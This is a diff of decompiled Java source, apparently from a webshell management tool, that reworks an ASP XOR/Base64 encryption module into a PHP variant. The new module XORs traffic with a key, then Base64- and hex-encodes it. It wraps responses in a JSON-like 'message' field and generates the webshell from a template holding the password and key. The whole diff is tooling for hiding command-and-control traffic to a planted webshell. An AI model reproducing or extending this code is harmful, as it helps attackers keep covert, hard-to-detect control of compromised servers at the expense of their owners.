@@ -3,24 +3,24 @@
 // (powered by FernFlower decompiler)
 //
 
-package shells.cryptions.aspXor;
+package shells.cryptions.phpXor;
 
 import core.annotation.CryptionAnnotation;
 import core.imp.Cryption;
 import core.shell.ShellEntity;
-import java.net.URLEncoder;
-import java.util.Random;
-
-import shells.cryptions.phpXor.PhpXormessage;
 import util.Log;
 import util.functions;
 import util.http.Http;
+import java.lang.String;
 
-@CryptionAnnotation(
-        Name = "ASP_XOR_BASE64_MESSAGE",
-        payloadName = "AspDynamicPayload"
-)
-public class AspXorBase64message implements Cryption {
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+
+//@CryptionAnnotation(
+//        Name = "PHP_XOR_BASE64_HEX",
+//        payloadName = "PhpDynamicPayload"
+//)
+public abstract class PhpXorhex implements Cryption {
     private ShellEntity shell;
     private Http http;
     private byte[] key;
@@ -30,7 +30,7 @@ public class AspXorBase64message implements Cryption {
     private String findStrLeft;
     private String findStrRight;
 
-    public AspXorBase64message() {
+    public PhpXorhex() {
     }
 
     public void init(ShellEntity context) {
@@ -39,10 +39,10 @@ public class AspXorBase64message implements Cryption {
         this.key = this.shell.getSecretKeyX().getBytes();
         this.pass = this.shell.getPassword();
         String findStrMd5 = functions.md5(this.pass + new String(this.key));
+        //this.findStrLeft = findStrMd5.substring(0, 16);
+        //this.findStrRight = findStrMd5.substring(16);
         this.findStrLeft = "{\"message\":\"";
         this.findStrRight = "\"}";
-//        this.findStrLeft = findStrMd5.substring(0, 6);
-//        this.findStrRight = findStrMd5.substring(20, 26);
 
         try {
             this.payload = this.shell.getPayloadModule().getPayload();
@@ -87,26 +87,39 @@ public class AspXorBase64message implements Cryption {
         return true;
     }
 
-    protected void decryption(byte[] data, byte[] key) {
-        int len = data.length;
-        int keyLen = key.length;
-        //int index = false;
+    public byte[] E(byte[] cs) {
+        int len = cs.length;
 
-        for (int i = 1; i <= len; ++i) {
-            int index = i - 1;
-            data[index] ^= key[i % keyLen];
+        for(int i = 0; i < len; ++i) {
+            cs[i] ^= this.key[i + 1 & 15];
         }
 
+
+        String Str1 = functions.base64EncodeToString(cs);
+//        //return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
+//        System.out.println(Str1);
+
+        StringBuilder hexString = new StringBuilder();
+        byte[] bytes = Str1.getBytes(StandardCharsets.UTF_8);
+        for (byte b : bytes) {
+            hexString.append(String.format("%02X", b)); // 转换为Hex并拼接
+        }
+
+       // System.out.println("Hex Output: " + hexString.toString());
+
+        return (this.pass + "=" + hexString).getBytes();
+
     }
 
-    public byte[] E(byte[] cs) {
-        this.decryption(cs, this.key);
-        return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
-    }
 
     public byte[] D(String data) {
         byte[] cs = functions.base64Decode(data);
-        this.decryption(cs, this.key);
+        int len = cs.length;
+
+        for(int i = 0; i < len; ++i) {
+            cs[i] ^= this.key[i + 1 & 15];
+        }
+
         return cs;
     }
 
@@ -120,8 +133,6 @@ public class AspXorBase64message implements Cryption {
     }
 
     public byte[] generate(String password, String secretKey) {
-
-        return Generate.GenerateShellLodermessage(password, functions.md5(secretKey).substring(0, 16), this.getClass().getSimpleName());
-
+        return (new String(functions.readInputStreamAutoClose(PhpXorhex.class.getResourceAsStream("template/xorbase64message.bin")))).replace("{pass}", password).replace("{secretKey}", functions.md5(secretKey).substring(0, 16)).getBytes();
     }
 }
